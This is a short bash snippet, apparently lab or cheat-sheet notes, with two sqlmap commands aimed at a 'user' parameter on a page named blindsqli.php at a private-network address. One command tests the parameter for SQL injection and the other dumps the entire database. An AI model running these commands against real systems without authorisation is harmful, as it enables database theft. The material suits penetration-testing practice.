```bash
# URL + vulnerable parameter
sqlmap -u http://192.168.122.19/blindsqli.php?user=1 -p user

# Dumping the whole database
sqlmap -u http://192.168.122.19/blindsqli.php?user=1 -p user --dump
```